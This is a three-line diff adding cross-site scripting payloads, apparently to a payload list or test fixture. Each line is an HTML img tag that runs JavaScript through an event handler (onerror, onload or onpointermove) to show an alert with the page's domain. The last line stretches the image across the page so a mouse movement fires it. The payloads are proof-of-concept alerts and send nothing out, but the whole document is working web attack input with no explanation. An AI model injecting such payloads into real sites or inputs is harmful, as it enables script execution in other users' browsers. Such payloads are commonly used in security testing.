@@ -1,0 +1,3 @@
+<img src=0 onerror='alert(document.domain)'>
+<img src='https://www.w3.org/People/mimasa/test/imgformat/img/w3c_home.png' onload=alert(document.domain)>
+<img src="https://www.w3.org/People/mimasa/test/imgformat/img/w3c_home.png" onpointermove="alert(1)" style="width: 99999px;">
